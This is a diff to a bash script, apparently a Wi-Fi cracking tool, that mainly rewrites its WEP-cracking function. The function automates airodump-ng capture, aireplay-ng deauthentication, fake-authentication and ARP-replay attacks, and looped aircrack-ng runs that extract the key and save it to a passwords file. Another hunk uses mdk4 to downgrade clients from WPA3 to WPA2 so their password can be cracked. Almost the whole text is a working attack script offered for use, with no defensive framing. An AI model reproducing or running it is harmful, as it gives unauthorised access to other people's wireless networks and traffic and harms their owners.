@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# version: 3.5.4 23/5/25 13:10
+# version: 3.5.4 23/5/25 14:10
 
 
 ### Changlog ###
@@ -378,11 +378,11 @@ function choose_network() {
             echo -e "Choose different Network.\n"
             continue  
         elif [[ "$encryption" == "WPA3" ]]; then
-            echo -e "\033[1mThe encryption is "$encryption". This script can't crack it yet.\033[0m"
+            echo -e "\033[1mThe Encryption is "$encryption". This script can't crack it yet.\033[0m"
             echo -e "Choose different Network.\n"
             continue           
         elif [[ "$encryption" == "WEP" ]]; then
-            echo -e "\033[1mThe encryption is "$encryption".\033[0m"
+            #echo -e "\033[1mThe Encryption is "$encryption".\033[0m"
 	    crack_wep
             continue                    
         fi
@@ -546,7 +546,7 @@ function devices_scanner() {
 # Router with Mixed Encryption
 # ------------------------------
 function mixed_encryption() {
-    echo -e "\033[1mThe encryption is "$encryption". \nThe devices may be using WPA3, we will try to trick them to switch to WPA2 so we could crack the password.\033[0m\n"
+    echo -e "\033[1mThe Encryption is "$encryption". \nThe devices may be using WPA3, we will try to trick them to switch to WPA2 so we could crack the password.\033[0m\n"
     gnome-terminal --geometry=70x3-10000-10000 -- sudo timeout 95s mdk4 $wifi_adapter"mon" b -n $bssid_name_original -c $channel -w a
     sleep 5
 }
@@ -610,49 +610,127 @@ function deauth_attack() {
 # -------------------------
 function crack_wep() {
     output_file="$targets_path/$bssid_name/WEP_output.txt"
+    airodump_terminal_pid=""
+    arp_replay_terminal_pid=""
+
     if [ -d "$targets_path/$bssid_name" ]; then
         rm -rf "$targets_path/$bssid_name"
     fi
-    mkdir "$targets_path/$bssid_name"
-    touch $output_file
+    mkdir -p "$targets_path/$bssid_name" # Ensure directory is created
+    touch "$output_file"
 
-    echo -e "Usually capture between 30K-50K IVs [the #Data field] is enough to crack the WEP password.\n"
-    echo -e "[*] Starting packet capture...\n\n" 
+    echo -e "\n\033[1;33mStarting WEP Cracking:\033[0m"
+    #echo -e "A new window will open for \033[1;32mairodump-ng\033[0m."
+    echo -e "Monitor the \033[1;36m#Data\033[0m column in the \033[1;32maircrack-ng\033[0m window. You typically need 30K-50K IVs."
+    #echo -e "Other windows for attacks (deauth, fake auth, ARP replay) will also appear.\n"
+    #echo -e "[*] Starting packet capture (airodump-ng)..."
     
-    gnome-terminal --wait --geometry=92x17-10000-10000 -- bash -c "sudo airodump-ng --bssid $bssid_address --channel $channel --write "$targets_path/$bssid_name/$bssid_name" ${wifi_adapter}mon" &
-    airodump_pid=$!
+    # Start airodump-ng in a new terminal and get the terminal's PID
+    # The 'exec bash' at the end of commands run in gnome-terminal keeps the terminal open after the command finishes, useful for inspection.
+    # Remove 'exec bash' if you want the terminal to close automatically.
+    gnome-terminal --geometry=92x17-10000-10000 -- bash -c "sudo airodump-ng --bssid $bssid_address --channel $channel --write \"$targets_path/$bssid_name/$bssid_name\" ${wifi_adapter}mon; exec bash" &
+    airodump_terminal_pid=$!
 
-    sleep 10
-    
-    # Deauth clinets for faster packet capture
-    gnome-terminal --geometry=78x4-10000-10000 -- sudo timeout 10s aireplay-ng --deauth 10 -a "$bssid_address" "$wifi_adapter"mon
-    
-    # Fake connecting to the AP
-    gnome-terminal --geometry=78x4-10000-10000 -- bash -c "sudo aireplay-ng -1 0 -a $bssid_address -h $random_mac ${wifi_adapter}mon"
+    #echo -e "[*] Waiting 6 seconds for airodump-ng to initialize and create capture files..."
+    sleep 6
 
+    # Check if capture file was created
+    if [ ! -f "$targets_path/$bssid_name/$bssid_name-01.cap" ]; then
+        echo -e "\033[1;31mError: Capture file ($targets_path/$bssid_name/$bssid_name-01.cap) not created. Airodump-ng might have failed. Aborting WEP crack.\033[0m"
+        if [ -n "$airodump_terminal_pid" ]; then sudo kill "$airodump_terminal_pid" 2>/dev/null; fi
+        return 1
+    fi
+    
+    echo -e "[*] Attempting deauthentication attack to generate IVs..."
+    gnome-terminal --geometry=78x4-10000-10000 -- sudo timeout 10s aireplay-ng --deauth 10 -a "$bssid_address" "${wifi_adapter}mon"
+    # No need to wait for deauth terminal, it's short-lived
+
+    echo -e "[*] Attempting fake authentication with AP ($bssid_address)..."
+    gnome-terminal --geometry=78x5-10000-10000 -- bash -c "sudo aireplay-ng -1 0 -a $bssid_address -h $random_mac ${wifi_adapter}mon; echo 'Fake auth attempt finished. Press Enter to close.'; read"
+    #echo -e "[*] Pausing for 3 seconds after fake authentication attempt..."
+    sleep 3 # Give time for fake auth to potentially associate
+
+    echo -e "[*] Attempting ARP Replay attack to generate IVs faster..."
+    # Start ARP Replay in a new terminal and get its PID
+    gnome-terminal --geometry=78x6-10000+10000 -- bash -c "sudo aireplay-ng -3 -b $bssid_address -h $random_mac ${wifi_adapter}mon; echo 'ARP Replay attack finished or stopped. Press Enter to close.'; read" &
+    arp_replay_terminal_pid=$!
+    sleep 2 # Give ARP replay a moment to start
+
+    #echo -e "\n[*] Entering cracking loop. Will attempt to crack with aircrack-ng periodically."
+    #echo -e "    You can monitor IVs in the airodump-ng window and cracking attempts in new aircrack-ng windows."
+
+    attempts=0
     while true; do
+        ((attempts++))
+        echo -e "\n--- Cracking Attempt $attempts ---"
+        
+        # Check if key already found by a previous manual check or other process
         if grep -q "KEY FOUND!" "$output_file"; then
-            kill "$airodump_pid"
+            echo -e "\033[1;32mKey already found in output file (perhaps manually or by a concurrent process)!\033[0m"
             break
         fi
+
+        #echo -e "[*] Running aircrack-ng (10s timeout)..."
+        # Use --wait for this terminal as we want the script to wait for aircrack-ng's attempt
+        # CRITICAL FIX: Changed 'tee' to 'tee -a' to append to the output file
+        gnome-terminal --wait --geometry=84x23-10000+10000 -- bash -c "sudo timeout 10s aircrack-ng -b $bssid_address \"$targets_path/$bssid_name/$bssid_name-01.cap\" | tee -a \"$output_file\"; echo 'Aircrack-ng attempt finished. This window will close in 5s.'; sleep 5"
+        
+        # Check if aircrack-ng found the key in its latest output
+        if grep -q "KEY FOUND!" "$output_file"; then
+            echo -e "\033[1;32mKEY FOUND by aircrack-ng!\033[0m"
+            break
+        else
+            echo -e "[*] Key not found in this attempt. Will retry after 3 seconds."
+            #echo -e "    Ensure enough IVs (#Data) are being collected."
+            #echo -e "    If IV count is stagnant, ARP replay might not be effective (e.g., no clients or AP not responding to ARP requests)."
+        fi
     
-        gnome-terminal --wait --geometry=84x23-10000+10000 -- bash -c "sudo timeout 5 aircrack-ng -b $bssid_address $targets_path/$bssid_name/$bssid_name-01.cap | tee $targets_path/$bssid_name/WEP_output.txt"
-    
-        sleep 3
+        sleep 3 # Wait before next cracking attempt
     done
 
-    if grep -q "ASCII:" "$output_file"; then
-        wifi_pass=$(grep "ASCII:" $targets_path/$bssid_name/WEP_output.txt | sed -E 's/.*ASCII: ([^)]*).*/\1/')
+    #echo -e "\n[*] Exited cracking loop."
+
+    # Kill the airodump-ng and ARP replay terminals
+    if [ -n "$airodump_terminal_pid" ] && kill -0 "$airodump_terminal_pid" 2>/dev/null; then
+        echo "[*] Closing airodump-ng terminal..."
+        sudo kill "$airodump_terminal_pid" 2>/dev/null
+    fi
+    if [ -n "$arp_replay_terminal_pid" ] && kill -0 "$arp_replay_terminal_pid" 2>/dev/null; then
+        echo "[*] Closing ARP replay terminal..."
+        sudo kill "$arp_replay_terminal_pid" 2>/dev/null
+    fi
+    # General cleanup for any stray aireplay processes
+    sudo pkill aireplay-ng > /dev/null 2>&1
+    sudo pkill airodump-ng > /dev/null 2>&1
+
+
+    if grep -q "KEY FOUND!" "$output_file"; then
+        # Try to extract ASCII first
+        wifi_pass=$(grep "KEY FOUND!" "$output_file" | tail -n 1 | sed -n 's/.*ASCII: \([^)]*\).*/\1/p')
+        if [ -z "$wifi_pass" ]; then
+            # If ASCII not found or empty, extract HEX
+            wifi_pass=$(grep "KEY FOUND!" "$output_file" | tail -n 1 | sed -n 's/.*KEY FOUND! \[ \([^ ]*\) \].*/\1/p' | tr -d ':')
+            echo -e "\033[1;33mWEP Key (HEX):\033[0m \033[1;32m$wifi_pass\033[0m"
+        else
+            echo -e "\033[1;33mWEP Key (ASCII):\033[0m \033[1;32m$wifi_pass\033[0m"
+        fi
+        
+        echo -e "\n\n\033[1;34mThe Wi-Fi password for\033[0m \033[1;31m\033[1m$bssid_name_original\033[0m \033[1;34mis:\033[0m \033[1;32m$wifi_pass\033[0m"
+        echo -e "Important: If this is a HEX key, you might not need to enter the colons (:)."
+        echo -e "---" >> "$targets_path/wifi_passwords.txt"
+        printf "The Wi-Fi password for %s (%s) is: %s\n" "$bssid_name_original" "$bssid_address" "$wifi_pass" >> "$targets_path/wifi_passwords.txt"
     else
-        wifi_pass=$(grep -oP 'KEY FOUND! \[ \K[0-9A-F:]+(?=\s\])' $targets_path/$bssid_name/WEP_output.txt | tr -d ':')            
+        echo -e "\033[1;31mFailed to crack WEP password after attempts.\033[0m"
+        echo -e "Consider running the capture for a longer time to collect more IVs."
     fi
 
-    echo -e "\033[1;34mThe Wi-Fi password of\033[0m \033[1;31m\033[1m$bssid_name_original\033[0m \033[1;34mis:\033[0m	\033[1;33m$wifi_pass\033[0m	Important: The password may be in Upper or Lower case or both. Try them if the password is not correct."
-    echo -e --- >> $targets_path/wifi_passwords.txt
-    printf "The Wi-Fi password of $bssid_name ($bssid_address) is:   $wifi_pass" >> "$targets_path/wifi_passwords.txt"
-
-    cleanup
-    exit 0
+    cleanup # Call your main cleanup function
+    #echo -e "\nReturning to network selection or exiting..."
+    # Decide if you want to call another_scan_prompt or exit from here
+    # For now, it will fall through to the calling logic in choose_network
+    # If you want to exit script after WEP attempt: exit 0 (success) or exit 1 (if failed)
+    # another_scan_prompt 
+    exit 1
 }
 
 
